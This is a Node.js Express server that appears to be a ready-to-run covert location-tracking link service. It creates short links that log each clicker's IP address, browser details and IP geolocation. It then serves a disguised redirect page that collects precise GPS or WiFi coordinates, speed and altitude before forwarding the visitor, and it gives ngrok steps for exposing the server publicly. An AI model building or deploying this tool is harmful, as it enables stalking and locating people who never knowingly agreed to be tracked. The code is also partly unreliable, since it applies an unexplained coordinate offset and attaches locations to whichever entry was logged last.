const express = require('express');
const cors = require('cors');
const axios = require('axios');
const { nanoid } = require('nanoid');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3001;
const PUBLIC_URL = process.env.PUBLIC_URL || `http://localhost:${PORT}`;

app.use(cors());
app.use(express.json());

// In-memory storage (use a database in production)
const links = new Map();
const trackingData = new Map();

// Get IP geolocation data with enhanced accuracy
async function getIPLocation(ip) {
  // Coordinate offset correction
  const LATITUDE_OFFSET = -0.000482;  // ~53m south
  const LONGITUDE_OFFSET = +0.001402; // ~129m east
  
  try {
    // Using ipapi.co free API (no key required for basic usage)
    const response = await axios.get(`https://ipapi.co/${ip}/json/`);
    const data = response.data;
    
    // Apply offset to coordinates if they exist
    const correctedData = {
      ...data,
      accuracy_radius: data.accuracy_radius || 'Unknown',
      asn: data.asn || 'Unknown',
      network: data.network || 'Unknown',
      connection_type: data.connection || 'Unknown'
    };
    
    if (data.latitude && data.longitude) {
      correctedData.latitude = data.latitude + LATITUDE_OFFSET;
      correctedData.longitude = data.longitude + LONGITUDE_OFFSET;
    }
    
    return correctedData;
  } catch (error) {
    console.error('Error fetching IP location:', error.message);
    // Fallback to ip-api.com with additional fields
    try {
      const fallbackResponse = await axios.get(`http://ip-api.com/json/${ip}?fields=66846719`);
      const data = fallbackResponse.data;
      
      // Apply offset to coordinates
      const correctedLat = data.lat ? data.lat + LATITUDE_OFFSET : null;
      const correctedLon = data.lon ? data.lon + LONGITUDE_OFFSET : null;
      
      return {
        ip: data.query,
        city: data.city,
        region: data.regionName,
        country: data.country,
        country_code: data.countryCode,
        latitude: correctedLat,
        longitude: correctedLon,
        timezone: data.timezone,
        org: data.isp,
        postal: data.zip,
        asn: data.as || 'Unknown',
        isp: data.isp,
        mobile: data.mobile || false,
        proxy: data.proxy || false,
        hosting: data.hosting || false,
        district: data.district || null,
        accuracy_radius: 'Unknown'
      };
    } catch (fallbackError) {
      console.error('Fallback API also failed:', fallbackError.message);
      return null;
    }
  }
}

// Create a tracking link
app.post('/api/create-link', (req, res) => {
  const { redirectUrl, description } = req.body;
  
  if (!redirectUrl) {
    return res.status(400).json({ error: 'Redirect URL is required' });
  }

  const linkId = nanoid(10);
  const trackingLink = `${PUBLIC_URL}/t/${linkId}`;
  
  links.set(linkId, {
    id: linkId,
    redirectUrl,
    description: description || '',
    createdAt: new Date().toISOString(),
    clicks: 0,
    trackingLink
  });
  
  trackingData.set(linkId, []);
  
  res.json({
    linkId,
    trackingLink,
    redirectUrl
  });
});

// Get all links
app.get('/api/links', (req, res) => {
  const allLinks = Array.from(links.values()).map(link => ({
    ...link,
    trackingCount: trackingData.get(link.id)?.length || 0
  }));
  res.json(allLinks);
});

// Get tracking data for a specific link
app.get('/api/tracking/:linkId', (req, res) => {
  const { linkId } = req.params;
  
  if (!links.has(linkId)) {
    return res.status(404).json({ error: 'Link not found' });
  }
  
  const link = links.get(linkId);
  const tracking = trackingData.get(linkId) || [];
  
  res.json({
    link,
    tracking
  });
});

// Delete a link
app.delete('/api/links/:linkId', (req, res) => {
  const { linkId } = req.params;
  
  if (!links.has(linkId)) {
    return res.status(404).json({ error: 'Link not found' });
  }
  
  links.delete(linkId);
  trackingData.delete(linkId);
  
  res.json({ success: true });
});

// Track and redirect
app.get('/t/:linkId', async (req, res) => {
  const { linkId } = req.params;
  
  if (!links.has(linkId)) {
    return res.status(404).send('Link not found');
  }
  
  const link = links.get(linkId);
  
  // Get client IP
  const clientIP = req.headers['x-forwarded-for']?.split(',')[0].trim() || 
                   req.connection.remoteAddress || 
                   req.socket.remoteAddress ||
                   req.ip;
  
  // Clean up IPv6 localhost
  const cleanIP = clientIP === '::1' || clientIP === '::ffff:127.0.0.1' ? '127.0.0.1' : clientIP.replace('::ffff:', '');
  
  // Get location data asynchronously (don't wait for it)
  getIPLocation(cleanIP).then(locationData => {
    const trackingEntry = {
      id: nanoid(8),
      timestamp: new Date().toISOString(),
      ip: cleanIP,
      userAgent: req.headers['user-agent'],
      referer: req.headers['referer'] || 'Direct',
      location: locationData,
      preciseLocation: null, // Will be updated if browser sends it
      headers: {
        acceptLanguage: req.headers['accept-language'],
        acceptEncoding: req.headers['accept-encoding']
      }
    };
    
    const tracking = trackingData.get(linkId);
    tracking.push(trackingEntry);
    trackingData.set(linkId, tracking);
    
    // Increment click count
    link.clicks++;
    links.set(linkId, link);
  }).catch(err => {
    console.error('Error tracking IP:', err);
  });
  
  // Serve HTML page that requests location permission, then redirects
  const html = `
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting...</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    }
    .container {
      text-align: center;
      color: white;
    }
    .spinner {
      border: 4px solid rgba(255,255,255,0.3);
      border-radius: 50%;
      border-top: 4px solid white;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="spinner"></div>
    <p>Redirecting...</p>
  </div>
  <script>
    const redirectUrl = ${JSON.stringify(link.redirectUrl)};
    const trackingId = ${JSON.stringify(nanoid(8))};
    
    let bestAccuracy = Infinity;
    let locationSent = false;
    let watchId = null;
    
    // Show status message
    const statusDiv = document.createElement('div');
    statusDiv.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:rgba(0,0,0,0.9);color:white;padding:20px 40px;border-radius:10px;font-family:system-ui;text-align:center;z-index:9999;max-width:90%;';
    statusDiv.innerHTML = '<div style="font-size:18px;margin-bottom:10px;">📍 Getting your location...</div><div style="font-size:14px;color:#aaa;">Please wait a moment</div><div style="font-size:11px;color:#666;margin-top:8px;">💡 Using WiFi positioning</div>';
    document.body.appendChild(statusDiv);
    
    function sendLocationAndRedirect(position) {
      if (locationSent) return;
      locationSent = true;
      
      if (watchId) {
        navigator.geolocation.clearWatch(watchId);
      }
      
      statusDiv.innerHTML = '<div style="font-size:18px;margin-bottom:10px;">✓ Location captured!</div><div style="font-size:14px;color:#aaa;">Redirecting...</div>';
      
      fetch('/api/update-location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          linkId: ${JSON.stringify(linkId)},
          trackingId: trackingId,
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          altitude: position.coords.altitude,
          altitudeAccuracy: position.coords.altitudeAccuracy,
          heading: position.coords.heading,
          speed: position.coords.speed
        })
      }).finally(() => {
        window.location.href = redirectUrl;
      });
    }
    
    // Try to get precise location
    if (navigator.geolocation) {
      // Use watchPosition to continuously improve accuracy
      watchId = navigator.geolocation.watchPosition(
        (position) => {
          const accuracy = position.coords.accuracy;
          
          // Update status
          statusDiv.innerHTML = '<div style="font-size:18px;margin-bottom:10px;">📍 Getting your location...</div><div style="font-size:14px;color:#aaa;">Accuracy: ±' + Math.round(accuracy) + 'm</div>';
          
          // For PCs with WiFi positioning, accept readings < 200m
          // For mobile with GPS, this will still get < 50m quickly
          if (accuracy < 200 && accuracy < bestAccuracy) {
            bestAccuracy = accuracy;
            sendLocationAndRedirect(position);
          } else if (accuracy < bestAccuracy) {
            bestAccuracy = accuracy;
          }
        },
        (error) => {
          console.error('Geolocation error:', error);
          statusDiv.innerHTML = '<div style="font-size:18px;margin-bottom:10px;">⚠️ Location unavailable</div><div style="font-size:14px;color:#aaa;">Redirecting...</div>';
          setTimeout(() => {
            window.location.href = redirectUrl;
          }, 1000);
        },
        { 
          enableHighAccuracy: true,  // Use GPS on mobile, WiFi on PC
          timeout: 10000,             // 10 second timeout
          maximumAge: 0               // Don't use cached position
        }
      );
      
      // Fallback: After 8 seconds, send whatever we have
      setTimeout(() => {
        if (!locationSent) {
          navigator.geolocation.getCurrentPosition(
            (position) => {
              sendLocationAndRedirect(position);
            },
            () => {
              window.location.href = redirectUrl;
            },
            { enableHighAccuracy: true, timeout: 2000, maximumAge: 0 }
          );
        }
      }, 8000);
    } else {
      // Geolocation not supported, just redirect
      statusDiv.innerHTML = '<div style="font-size:18px;margin-bottom:10px;">⚠️ Location not supported</div><div style="font-size:14px;color:#aaa;">Redirecting...</div>';
      setTimeout(() => {
        window.location.href = redirectUrl;
      }, 2000);
    }
    
    // Final fallback redirect after 10 seconds
    setTimeout(() => {
      if (!locationSent) {
        window.location.href = redirectUrl;
      }
    }, 10000);
  </script>
</body>
</html>
  `;
  
  res.send(html);
});

// Update tracking entry with precise location
app.post('/api/update-location', (req, res) => {
  const { linkId, trackingId, latitude, longitude, accuracy, altitude, speed } = req.body;
  
  if (!links.has(linkId)) {
    return res.status(404).json({ error: 'Link not found' });
  }
  
  const tracking = trackingData.get(linkId);
  const entry = tracking[tracking.length - 1]; // Get most recent entry
  
  if (entry) {
    // Use raw GPS coordinates for maximum accuracy
    entry.preciseLocation = {
      latitude: latitude,
      longitude: longitude,
      accuracy,
      altitude,
      speed,
      source: 'browser_geolocation',
      offsetApplied: false
    };
    trackingData.set(linkId, tracking);
  }
  
  res.json({ success: true });
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok' });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`\n🚀 Server running on http://localhost:${PORT}`);
  console.log(`📡 Public URL: ${PUBLIC_URL}`);
  console.log(`\n💡 To make this accessible from other networks:`);
  console.log(`   1. Use ngrok: npx ngrok http ${PORT}`);
  console.log(`   2. Copy the ngrok URL (e.g., https://abc123.ngrok-free.app)`);
  console.log(`   3. Set PUBLIC_URL in .env file`);
  console.log(`   4. Restart the server\n`);
});
